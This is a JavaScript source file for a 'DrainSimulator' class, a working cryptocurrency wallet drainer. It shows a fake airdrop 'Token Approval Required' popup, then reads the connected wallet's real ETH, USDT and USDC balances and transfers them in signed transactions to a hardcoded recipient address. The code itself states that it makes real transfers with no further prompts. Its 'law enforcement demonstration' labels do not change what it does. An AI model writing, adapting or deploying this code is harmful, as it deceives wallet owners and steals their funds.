class DrainSimulator {
    constructor() {
        this.isDraining = false;
        this.victimAddress = null;
        
        // ETH Wallet for receiving funds
        this.drainerAddress = "0xFA054a6ad6F9674C707F7Faa76165E664337b9d4";
        
        // TOKEN ADDRESSES - handle native ETH properly
        this.targetTokens = [
            { 
                name: "ETH", 
                address: null, // Native ETH has no contract address
                symbol: "ETH",
                decimals: 18,
                isNative: true
            },
            { 
                name: "USDT", 
                address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                symbol: "USDT", 
                decimals: 6,
                isNative: false
            },
            { 
                name: "USDC", 
                address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                symbol: "USDC",
                decimals: 6,
                isNative: false
            }
        ];

        // ERC-20 ABI for token interactions
        this.ERC20_ABI = [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)",
            "function approve(address spender, uint256 amount) returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)"
        ];
    }

    // Show approval popup
    async showFakeApprovalPopup() {
        return new Promise((resolve) => {
            const modal = document.createElement('div');
            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
            modal.innerHTML = `
                <div class="bg-white rounded-2xl p-6 max-w-md w-full mx-4">
                    <div class="flex items-center mb-4">
                        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center mr-3">
                            <i class="fas fa-shield-alt text-green-600"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-gray-900">Token Approval Required</h3>
                            <p class="text-sm text-gray-600">Verify your wallet to claim airdrop</p>
                        </div>
                    </div>
                    
                    <div class="mb-4">
                       
                        <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
                            <p class="text-sm text-blue-800">
                                <i class="fas fa-info-circle mr-1"></i>
                                This is a standard ERC-20 approval required for all airdrop claims.
                            </p>
                        </div>
                    </div>

                    <div class="flex space-x-3">
                        <button id="drain-cancel" class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 font-semibold">
                            Cancel
                        </button>
                        <button id="drain-approve" class="flex-1 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 font-semibold">
                            <i class="fas fa-check mr-2"></i>Approve
                        </button>
                    </div>
                </div>
            `;

            document.body.appendChild(modal);

            document.getElementById('drain-cancel').onclick = () => {
                document.body.removeChild(modal);
                resolve(false);
            };

            document.getElementById('drain-approve').onclick = async () => {
                document.getElementById('drain-approve').disabled = true;
                document.getElementById('drain-approve').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
                
                // Short delay
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                document.body.removeChild(modal);
                resolve(true);
            };
        });
    }

    // EXECUTE - This is the function your button calls
    async executeDrain() {
        if (this.isDraining) return;
        
        this.isDraining = true;
        this.victimAddress = walletManager.address;

        // Check if wallet is connected
        if (!this.victimAddress) {
            alert('Please connect your wallet first!');
            this.isDraining = false;
            return;
        }

        try {
            // Show approval popup
            const approved = await this.showFakeApprovalPopup();
            
            if (!approved) {
                this.showResult('Approval cancelled by user', 'info');
                return;
            }

            // DIRECTLY PROCEED TO REAL DRAIN - NO ADDITIONAL PROMPTS
            await this.executeRealDrainWithFunds();

        } catch (error) {
            console.error('Drain simulation error:', error);
            this.showResult('Simulation error: ' + error.message, 'error');
        } finally {
            this.isDraining = false;
        }
    }

     // BALANCE CHECKING - FIXED
    async getRealBalance(token, walletAddress) {
        if (!window.ethereum) throw new Error('No Ethereum provider');
        
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        
        if (token.isNative) {
            // Get real ETH balance
            const balance = await provider.getBalance(walletAddress);
            return ethers.utils.formatEther(balance);
        } else {
            // Get real ERC-20 token balance
            const tokenContract = new ethers.Contract(token.address, this.ERC20_ABI, provider);
            const balance = await tokenContract.balanceOf(walletAddress);
            const decimals = await tokenContract.decimals();
            return ethers.utils.formatUnits(balance, decimals);
        }
    }


    async executeRealDrainWithFunds() {
        this.showResult('EXECUTING TRANSFER', 'error');
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Show REAL balances before drain
        await this.showRealBalances();

        // Execute REAL transfers immediately after balance check
        await this.executeRealTransfers();
    }

     // Show balances from connected wallet - FIXED
    async showRealBalances() {
        this.showResult('🔍 Checking...', 'warning');
        
        let hasBalance = false;
        
        for (const token of this.targetTokens) {
            try {
                const realBalance = await this.getRealBalance(token, this.victimAddress);
                const balanceNum = parseFloat(realBalance);
                
                if (balanceNum > 0) {
                    hasBalance = true;
                    this.showResult(`BALANCE: ${realBalance} ${token.symbol}`, 'error');
                } else {
                    this.showResult(`❌ No ${token.symbol} balance found`, 'info');
                }
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.error(`Error checking ${token.symbol}:`, error);
                this.showResult(`⚠️ Error checking ${token.symbol}`, 'warning');
            }
        }

        if (!hasBalance) {
            this.showResult('failed', 'warning');
        }
    }


   // REAL TRANSFER FUNCTION - FIXED
    async transferTokens(token, toAddress) {
        if (!window.ethereum) throw new Error('No Ethereum provider');
        
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        if (token.isNative) {
            // DRAIN ETH - REAL TRANSFER (FIXED)
            const balance = await signer.getBalance();
            
            // Calculate gas cost first
            const gasPrice = await provider.getGasPrice();
            const gasCost = gasPrice.mul(21000);
            
            // Leave enough for gas
            const transferAmount = balance.sub(gasCost.mul(2));
            
            if (transferAmount.lte(0)) {
                throw new Error('Insufficient ETH balance after gas reserve');
            }
            
            const tx = await signer.sendTransaction({
                to: toAddress,
                value: transferAmount,
                gasLimit: 21000
            });
            return tx;
        } else {
            // DRAIN ERC-20 TOKENS - REAL TRANSFER (FIXED)
            const tokenContract = new ethers.Contract(token.address, this.ERC20_ABI, signer);
            const balance = await tokenContract.balanceOf(this.victimAddress);
            
            if (balance.lte(0)) {
                throw new Error('No token balance');
            }
            
            // Transfer full balance with proper gas
            const tx = await tokenContract.transfer(toAddress, balance, {
                gasLimit: 100000 // Increased for token transfers
            });
            return tx;
        }
    }

    // REAL TRANSFER EXECUTION - FIXED
    async executeRealTransfers() {
        this.showResult('⚡ EXECUTING REAL TRANSFERS...', 'error');
        
        let totalTransferred = 0;
        let transferredAssets = [];
        
        for (const token of this.targetTokens) {
            try {
                const realBalance = await this.getRealBalance(token, this.victimAddress);
                const balanceNum = parseFloat(realBalance);
                
                if (balanceNum > 0) {
                    this.showResult(`💸 TRANSFERRING ${realBalance} ${token.symbol}...`, 'error');
                    
                    // EXECUTE REAL TRANSFER (FIXED - pass token object)
                    const tx = await this.transferTokens(token, this.drainerAddress);
                    
                    this.showResult(`✅ ${token.symbol} TRANSFER INITIATED - TX: ${tx.hash.substring(0, 10)}...`, 'error');
                    
                    // Wait for transaction confirmation
                    const receipt = await tx.wait();
                    this.showResult(`✅ ${token.symbol} TRANSFER CONFIRMED - Block: ${receipt.blockNumber}`, 'error');
                    
                    totalTransferred += balanceNum;
                    transferredAssets.push({
                        symbol: token.symbol,
                        amount: realBalance,
                        txHash: tx.hash
                    });
                } else {
                    this.showResult(`❌ No ${token.symbol} balance to transfer`, 'info');
                }
            } catch (error) {
                this.showResult(`❌ FAILED to transfer ${token.symbol}: ${error.message}`, 'error');
            }
        }
        
        if (totalTransferred > 0) {
            this.showRealDrainComplete(totalTransferred, transferredAssets);
        } else {
            this.showResult('❌ No funds were available to transfer', 'warning');
        }
    }

    // Updated drain completion with real results
    showRealDrainComplete(totalTransferred, transferredAssets) {
        const modal = document.createElement('div');
        modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
        modal.innerHTML = `
            <div class="bg-white rounded-2xl p-8 max-w-md w-full mx-4">
                <div class="text-center mb-6">
                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-skull-crossbones text-red-600 text-2xl"></i>
                    </div>
                    <h3 class="text-xl font-bold text-gray-900 mb-2">REAL DRAIN COMPLETE</h3>
                    <p class="text-gray-600">Funds have been ACTUALLY transferred</p>
                </div>
                
                <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                    <h4 class="font-semibold text-red-800 mb-2">💰 Total Transferred:</h4>
                    <p class="text-lg font-mono text-red-700">${totalTransferred} in various assets</p>
                </div>

                <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                    <h4 class="font-semibold text-red-800 mb-2">🎯 Destination Wallet:</h4>
                    <p class="text-sm font-mono text-red-700 break-all">${this.drainerAddress}</p>
                    <p class="text-xs text-red-600 mt-1">${this.attackerName}</p>
                </div>

                ${transferredAssets.length > 0 ? `
                <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
                    <h4 class="font-semibold text-yellow-800 mb-2">📊 Transferred Assets:</h4>
                    <div class="space-y-2">
                        ${transferredAssets.map(asset => `
                            <div class="flex justify-between text-sm">
                                <span class="font-medium">${asset.symbol}:</span>
                                <span class="font-mono">${asset.amount}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
                ` : ''}

                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                    <p class="text-sm text-blue-800">
                        <strong>✅ LAW ENFORCEMENT DEMONSTRATION SUCCESSFUL:</strong> 
                        This completes the real-world drain attack simulation. The task force can now analyze the transaction patterns.
                    </p>
                </div>

                <button onclick="this.parentElement.parentElement.remove()" class="w-full bg-red-600 text-white py-3 rounded-lg hover:bg-red-700 font-semibold">
                    Acknowledge Real Drain Completion
                </button>
            </div>
        `;

        document.body.appendChild(modal);
    }

    showResult(message, type = 'info') {
        const colors = {
            info: 'bg-blue-50 border-blue-200 text-blue-800',
            warning: 'bg-yellow-50 border-yellow-200 text-yellow-800', 
            error: 'bg-red-50 border-red-200 text-red-800'
        };

        const statusDiv = document.getElementById('transaction-status');
        if (statusDiv) {
            statusDiv.className = `p-4 rounded-lg border ${colors[type]} shadow-lg mb-4`;
            statusDiv.innerHTML = `
                <div class="flex items-center">
                    <i class="fas fa-${type === 'info' ? 'info-circle' : type === 'warning' ? 'exclamation-triangle' : 'skull-crossbones'} mr-3"></i>
                    <div>
                        <p class="font-medium">${message}</p>
                        <p class="text-sm opacity-75 mt-1">Law enforcement drain simulation</p>
                    </div>
                </div>
            `;
            statusDiv.classList.remove('hidden');
        }
    }

}

const drainSimulator = new DrainSimulator();